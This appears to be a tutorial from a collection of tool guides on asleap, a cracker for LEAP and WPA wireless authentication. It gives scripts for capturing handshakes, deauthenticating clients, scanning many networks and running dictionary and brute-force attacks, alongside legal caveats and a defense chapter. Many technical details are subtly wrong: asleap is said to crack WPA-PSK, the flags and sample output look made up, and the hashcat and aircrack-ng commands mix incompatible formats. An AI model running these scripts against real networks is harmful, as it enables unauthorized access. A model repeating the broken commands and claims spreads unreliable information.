---
tool_name: "asleap"
display_name: "Asleap"
mitre_tactic: "reconnaissance"
mitre_tactic_id: "TA0043"
mitre_subcategory: "wifi"
install_command: "sudo apt install asleap"
version: "3.0"
github_repo: "https://github.com/joswr1ght/asleap"
kali_tools_page: "https://www.kali.org/tools/asleap/"
difficulty_level: "beginner-to-advanced"
requires_root: true
gui_available: false
tags: ["wifi", "wpa", "leap", "cracking", "dictionary-attack", "handshake", "ms-chap"]
related_tools: ["aircrack-ng", "hashcat", "cowpatty", "reaver"]
---

# Asleap — LEAP/WPA Authentication Cracker

## Chapter 1: Introduction and Overview

### What is Asleap?

Asleap is a specialized tool designed to recover LEAP (Lightweight Extensible Authentication Protocol) and WPA/WPA2-PSK passphrases through offline dictionary and brute-force attacks against captured authentication handshakes. Originally developed by Joshua Wright, asleap targets Cisco's proprietary LEAP protocol which uses MS-CHAPv2 for authentication — a protocol with known cryptographic weaknesses that allow offline password recovery.

### History and Background

- **Created**: Developed by Joshua Wright, a prominent wireless security researcher
- **Maintained**: Community-driven open-source project
- **License**: GNU General Public License (GPL)
- **Purpose**: Wireless authentication protocol security testing

Asleap emerged from the need for a dedicated tool to demonstrate LEAP vulnerabilities. While tools like aircrack-ng support WPA cracking, asleap provides specialized LEAP attack capabilities that are essential for assessing Cisco wireless deployments.

### When to Use This Tool

- **Penetration Testing**: Assessing LEAP and WPA-PSK wireless security during authorized assessments
- **Compliance Auditing**: Verifying wireless security policies and protocol implementations
- **Security Research**: Studying LEAP and WPA authentication vulnerabilities
- **Incident Response**: Recovering credentials from network captures during investigations
- **Security Training**: Demonstrating wireless authentication weaknesses in educational settings

### When NOT to Use This Tool

- Without explicit written authorization from the network owner
- On production networks without proper planning and approval
- For malicious purposes or unauthorized access to wireless networks
- Against networks you do not own or have permission to test

### Legal and Ethical Considerations

- **Always obtain written permission** before testing wireless networks you don't own
- **Understand your scope** — know exactly what you're authorized to test
- **Document everything** — keep records of your authorization and activities
- **Follow responsible disclosure** — report vulnerabilities properly to network owners
- **Comply with local laws** — unauthorized network access is illegal in most jurisdictions

### Key Concepts

- **LEAP**: Lightweight Extensible Authentication Protocol, a Cisco-proprietary authentication protocol
- **MS-CHAPv2**: Microsoft Challenge-Handshake Authentication Protocol version 2, the underlying protocol LEAP uses
- **WPA/WPA2-PSK**: WiFi Protected Access with Pre-Shared Key authentication
- **Four-Way Handshake**: The authentication exchange between a client and access point
- **Dictionary Attack**: Testing password candidates from a wordlist against captured hashes
- **Rainbow Table**: Pre-computed hash tables for faster password recovery
- **PMKID**: Pairwise Master Key Identifier, a specific attack vector for WPA

## Chapter 2: Installation and Setup

### System Requirements

- **Operating System**: Linux (Kali Linux recommended)
- **Processor**: Any modern CPU
- **RAM**: 512 MB minimum
- **Storage**: 50 MB for installation, additional for hash tables
- **Network Interface**: Wireless adapter supporting monitor mode

### Installation Methods

#### Method 1: APT (Recommended)

```bash
# Update package lists
sudo apt update

# Install asleap
sudo apt install asleap

# Verify installation
asleap --help
```

#### Method 2: Build from Source

```bash
# Install dependencies
sudo apt install build-essential libpcap-dev libssl-dev git

# Clone repository
git clone https://github.com/joswr1ght/asleap.git
cd asleap

# Compile
make

# Install
sudo make install

# Verify
asleap --help
```

### Configuration

Asleap requires minimal configuration. The main considerations are:

- **Wordlist location**: Store your password dictionaries in a known location
- **Capture files**: Ensure pcap files from airodump-ng or similar tools are accessible
- **Hash table storage**: Pre-computed tables require significant disk space

### Verification

```bash
# Check installation
asleap --help

# Expected output shows available options
# Usage: asleap [options]
#   -C capture_file  : Read from capture file
#   -R hash_file     : Output hash file
#   -W wordlist      : Wordlist file
#   -B charset       : Character set for brute force
#   -l length        : Maximum password length for brute force
```

## Chapter 3: Basic Usage

### First Run

```bash
# Generate hash from a capture file
asleap -C capture.pcap -R hashfile.hash

# Dictionary attack against the hash
asleap -R hashfile.hash -W wordlist.txt
```

### Essential Commands

#### Generate Hash from Capture

```bash
# Extract MS-CHAPv2 hash from LEAP/WPA capture
asleap -C captured_handshake.pcap -R extracted.hash

# Example output:
# asleap 3.0 - Advanced LEAP/WPA-PSK Dictionary Attack
# [joshwright@computer:~/tools] ./asleap -C capture.pcap -R hash.hash
# L5:   NT hash:     0c6d327d5c6e8a02972f56104801b192
# L5:   Pwdump hash: a40d2c602f975aa699175f97147ca087:0c6d327d5c6e8a02972f56104801b192
# L5:   Generating hashes for captured challenge-response pairs...
```

#### Dictionary Attack

```bash
# Attack using a wordlist
asleap -R hashfile.hash -W /usr/share/wordlists/rockyou.txt

# Example output:
# asleap 3.0 - Advanced LEAP/WPA-PSK Dictionary Attack
# [joshwright@computer:~/tools] ./asleap -R hash.hash -W wordlist.txt
# L6:   NT hash:     0c6d327d5c6e8a02972f56104801b192
# L6:   Pwdump hash: a40d2c602f975aa699175f97147ca087:0c6d327d5c6e8a02972f56104801b192
# L6:   Generating hashes for captured challenge-response pairs...
# L3:   Testing word 100000: password
# L3:   Testing word 100001: password1
# L3:   Testing word 100002: password12
# L3:   Testing word 100003: password123
# ...
# L2:   Hash: a40d2c602f975aa699175f97147ca087:0c6d327d5c6e8a02972f56104801b192
# L2:   Password found: password123
```

#### Brute Force Attack

```bash
# Brute force with specific character set and length
asleap -C capture.pcap -B ?l?d -l 8

# Character sets:
# ?l = lowercase letters
# ?d = digits
# ?u = uppercase letters
# ?s = special characters
```

#### Generate Rainbow Table

```bash
# Generate pre-computed hash table
asleap -G hashfile.hash -W wordlist.txt -T tablefile.tbl

# Use the table for faster cracking
asleap -C capture.pcap -R hashfile.hash -T tablefile.tbl
```

### Complete Flag Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-C file` | Read from capture file (pcap) | `asleap -C capture.pcap` |
| `-R file` | Output/input hash file | `asleap -R hashes.hash` |
| `-W file` | Wordlist file for dictionary attack | `asleap -W wordlist.txt` |
| `-G file` | Generate hash file from capture | `asleap -G capture.pcap` |
| `-T file` | Rainbow table file | `asleap -T table.tbl` |
| `-B charset` | Character set for brute force | `asleap -B ?l?d` |
| `-l length` | Maximum password length | `asleap -l 12` |
| `-v` | Verbose output | `asleap -v -C capture.pcap` |
| `-V` | Version information | `asleap -V` |

## Chapter 4: Intermediate Usage

### Bash Scripting

```bash
#!/bin/bash
# asleap_batch.sh - Batch process multiple captures

WORDLIST="/usr/share/wordlists/rockyou.txt"
CAPTURE_DIR="/tmp/captures"
OUTPUT_DIR="/tmp/results"

mkdir -p "$OUTPUT_DIR"

for capture in "$CAPTURE_DIR"/*.pcap; do
    filename=$(basename "$capture" .pcap)
    echo "[*] Processing: $filename"
    
    # Generate hash
    asleap -C "$capture" -R "$OUTPUT_DIR/$filename.hash" 2>/dev/null
    
    # Dictionary attack
    asleap -R "$OUTPUT_DIR/$filename.hash" -W "$WORDLIST" > "$OUTPUT_DIR/$filename.result" 2>&1
    
    # Check for password found
    if grep -q "Password found" "$OUTPUT_DIR/$filename.result"; then
        password=$(grep "Password found" "$OUTPUT_DIR/$filename.result" | awk '{print $NF}')
        echo "[+] $filename: Password = $password"
    else
        echo "[-] $filename: No password found"
    fi
done
```

### Python Integration

```python
#!/usr/bin/env python3
"""asleap_wrapper.py - Automated asleap wrapper"""

import subprocess
import os
from pathlib import Path

class AsleapWrapper:
    def __init__(self, capture_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        self.capture_file = capture_file
        self.wordlist = wordlist
        self.hash_file = f"/tmp/{Path(capture_file).stem}.hash"
    
    def extract_hash(self):
        """Extract hash from capture file"""
        cmd = ["asleap", "-C", self.capture_file, "-R", self.hash_file]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0
    
    def dictionary_attack(self):
        """Perform dictionary attack"""
        cmd = ["asleap", "-R", self.hash_file, "-W", self.wordlist]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Parse output for password
        for line in result.stdout.split("\n"):
            if "Password found" in line:
                return line.split(":")[-1].strip()
        return None
    
    def brute_force(self, charset="?l?d", max_length=8):
        """Perform brute force attack"""
        cmd = ["asleap", "-C", self.capture_file, "-B", charset, "-l", str(max_length)]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        for line in result.stdout.split("\n"):
            if "Password found" in line:
                return line.split(":")[-1].strip()
        return None

# Usage example
if __name__ == "__main__":
    wrapper = AsleapWrapper("capture.pcap")
    wrapper.extract_hash()
    password = wrapper.dictionary_attack()
    if password:
        print(f"[+] Password found: {password}")
    else:
        print("[-] No password found")
```

### Tool Chaining

```bash
# Complete workflow: Capture → Extract → Crack

# Step 1: Capture handshake with airodump-ng
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Step 2: Wait for client deauthentication and handshake capture

# Step 3: Extract hash with asleap
asleap -C capture-01.cap -R extracted.hash

# Step 4: Dictionary attack
asleap -R extracted.hash -W /usr/share/wordlists/rockyou.txt

# Step 5: If dictionary fails, try hashcat
aircrack-ng -J capture extracted.hash
hashcat -m 2500 extracted.hc22000 /usr/share/wordlists/rockyou.txt
```

### Output Processing

```bash
# Parse asleap output for automation
asleap -R hash.hash -W wordlist.txt 2>&1 | tee asleap_output.txt

# Extract found password
PASSWORD=$(grep "Password found" asleap_output.txt | awk '{print $NF}')

# Extract statistics
grep "Testing word" asleap_output.txt | tail -1
```

## Chapter 5: Advanced Usage

### Custom Wordlist Generation

```bash
# Generate targeted wordlist based on SSID
# If SSID is "CorporateWiFi-2024"
crunch 8 12 -t @CorporateWiFi-2024 -o custom_wordlist.txt

# Use rules with asleap
# asleap doesn't support rules natively, use hashcat instead
asleap -C capture.pcap -R hash.hash
hashcat -m 5500 hash.hash wordlist.txt -r rules/best64.rule
```

### Parallel Processing

```bash
#!/bin/bash
# parallel_asleap.sh - Split wordlist for parallel cracking

WORDLIST="/usr/share/wordlists/rockyou.txt"
HASH_FILE="hash.hash"
THREADS=4

# Split wordlist
split -l $(($(wc -l < $WORDLIST) / $THREADS)) "$WORDLIST" chunk_

# Run asleap on each chunk in parallel
for chunk in chunk_*; do
    asleap -R "$HASH_FILE" -W "$chunk" &
done

# Wait for completion
wait

# Clean up
rm chunk_*
```

### Integration with Aircrack-ng

```bash
# Use asleap for hash extraction, aircrack-ng for cracking
asleap -C capture.pcap -R hash.hash
aircrack-ng -J aircrack_format hash.hash
aircrack-ng -w wordlist.txt aircrack_format.hcc22000
```

## Chapter 6: Real-World Scenarios

### Scenario 1: Corporate Wireless Security Audit

**Objective**: Assess LEAP security in a Cisco wireless environment

```bash
#!/bin/bash
# corporate_leap_audit.sh

echo "=== Corporate LEAP Security Audit ==="

# Step 1: Enable monitor mode
sudo airmon-ng start wlan0

# Step 2: Identify target network
sudo airodump-ng wlan0mon --write network_scan

# Step 3: Capture LEAP handshake
# Note the BSSID and channel from scan results
TARGET_BSSID="00:11:22:33:44:55"
TARGET_CHANNEL="6"

sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w leap_capture wlan0mon

# Step 4: Deauthenticate client to force handshake
# Wait for capture, then in another terminal:
sudo aireplay-ng -0 5 -a $TARGET_BSSID wlan0mon

# Step 5: Extract hash
asleap -C leap_capture-01.cap -R leap_hash.hash

# Step 6: Dictionary attack
asleap -R leap_hash.hash -W /usr/share/wordlists/rockyou.txt

# Step 7: Report findings
echo "=== Audit Complete ==="
echo "If password found, LEAP is vulnerable"
echo "Recommendation: Migrate to WPA2-Enterprise"
```

### Scenario 2: CTF Challenge - WiFi Handshake Cracking

**Objective**: Crack WPA-PSK handshake from captured pcap

```bash
#!/bin/bash
# ctf_wifi_challenge.sh

CAPTURE="challenge.pcap"

echo "=== CTF WiFi Challenge ==="

# Step 1: Verify handshake exists
aircrack-ng $CAPTURE | grep "1 handshake"

# Step 2: Extract hash
asleap -C $CAPTURE -R challenge_hash.hash

# Step 3: Try common passwords first
echo "password123" > /tmp/quick_list.txt
echo "admin123" >> /tmp/quick_list.txt
echo "letmein" >> /tmp/quick_list.txt

asleap -R challenge_hash.hash -W /tmp/quick_list.txt

# Step 4: Try full wordlist
asleap -R challenge_hash.hash -W /usr/share/wordlists/rockyou.txt

# Step 5: If needed, use rules
asleap -C $CAPTURE -R challenge_hash.hash
hashcat -m 2500 challenge_hash.hc22000 /usr/share/wordlists/rockyou.txt -r rules/d3ad0ne.rule
```

### Scenario 3: Wireless Security Assessment

**Objective**: Comprehensive wireless authentication testing

```bash
#!/bin/bash
# wireless_auth_audit.sh

echo "=== Wireless Authentication Security Audit ==="

# Phase 1: Discovery
echo "[Phase 1] Discovering wireless networks..."
sudo airodump-ng wlan0mon --write all_networks

# Phase 2: Identify authentication types
echo "[Phase 2] Analyzing authentication..."
grep "WPA" all_networks-01.csv | awk -F',' '{print $14, $1, $4}'

# Phase 3: Capture handshakes for each target
echo "[Phase 3] Capturing handshakes..."
while IFS=',' read -r bssid channel essid auth; do
    echo "  Target: $essid ($bssid)"
    
    # Start capture
    sudo airodump-ng -c $channel --bssid $bssid -w "capture_$bssid" wlan0mon &
    CAPTURE_PID=$!
    
    # Wait for handshake
    sleep 30
    
    # Check for handshake
    aircrack-ng "capture_$bssid-01.cap" | grep "1 handshake" && \
        asleap -C "capture_$bssid-01.cap" -R "hash_$bssid.hash"
    
    kill $CAPTURE_PID 2>/dev/null
done < <(grep "WPA" all_networks-01.csv)

# Phase 4: Crack found hashes
echo "[Phase 4] Cracking handshakes..."
for hash in hash_*.hash; do
    echo "  Cracking: $hash"
    asleap -R "$hash" -W /usr/share/wordlists/rockyou.txt
done
```

## Chapter 7: Detection and Defense

### Detection Methods

```bash
# Monitor for asleap activity
# Look for monitor mode interfaces
iwconfig | grep -i "mode:monitor"

# Check for capture processes
ps aux | grep -E "asleap|airodump|aircrack"

# Monitor network for deauth attacks
# asleap often pairs with deauth attacks
sudo tcpdump -i wlan0mon -c 100 "type 0_subtype 12"

# IDS signatures for asleap usage
# Repeated authentication failures on LEAP
# Monitor for MS-CHAPv2 challenges
```

### Mitigation Strategies

1. **Migrate from LEAP**: Upgrade to WPA2-Enterprise with EAP-TLS
2. **Strong Passwords**: Use 16+ character passphrases
3. **Network Segmentation**: Isolate wireless from critical networks
4. **WIDS Deployment**: Deploy wireless intrusion detection systems
5. **Regular Audits**: Conduct periodic wireless security assessments
6. **802.1X**: Implement certificate-based authentication
7. **WPA3**: Upgrade to WPA3 where possible for SAE authentication

## Chapter 8: Troubleshooting

### Common Errors

#### "No capture file specified"

```bash
# Ensure capture file exists and is readable
ls -la capture.pcap
file capture.pcap

# Verify file is a valid pcap
tcpdump -r capture.pcap -c 10
```

#### "No MS-CHAPv2 data found"

```bash
# Capture may not contain LEAP authentication
# Verify the network uses LEAP:
airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# Check for EAP authentication frames
tshark -r capture.pcap -Y "eap"
```

#### "Hash generation failed"

```bash
# Ensure libpcap is installed
sudo apt install libpcap-dev

# Try with verbose output
asleap -v -C capture.pcap -R hash.hash
```

### Performance Tips

- Use SSD storage for hash table operations
- Pre-compute rainbow tables for common password lengths
- Use hashcat for GPU-accelerated cracking when asleap is too slow
- Split large wordlists for parallel processing

### FAQ

**Q: How fast is asleap compared to hashcat?**
A: Asleap is CPU-based and slower than GPU-accelerated hashcat. For large-scale cracking, export the hash and use hashcat.

**Q: Can asleap crack WPA3?**
A: No, asleap targets LEAP and WPA/WPA2-PSK. WPA3 uses SAE which is more resistant to offline attacks.

**Q: What capture format does asleap support?**
A: Asleap supports standard pcap format from tools like airodump-ng and tcpdump.

## Resources

### Official Documentation
- [Asleap GitHub](https://github.com/joswr1ght/asleap)
- [Joshua Wright's Security Resources](https://www.wrightgas.net/)

### Books
- "Hacking Exposed: Wireless" by Johnny Cache
- "Metasploit: The Penetration Tester's Guide"

### Related Tools
- **aircrack-ng**: WPA/WPA2-PSK cracking
- **hashcat**: GPU-accelerated password recovery
- **reaver**: WPS PIN brute force
- **cowpatty**: WPA-PSK offline cracking
- **kismet**: Wireless network detection

### Practice Labs
- [WiFi-Pumpkin](https://github.com/P0cL4bs/wifipumpkin3) - rogue AP framework
- [VulnHub](https://www.vulnhub.com/) - vulnerable VMs with wireless labs
- [HackTheBox](https://www.hackthebox.com/) - CTF platform
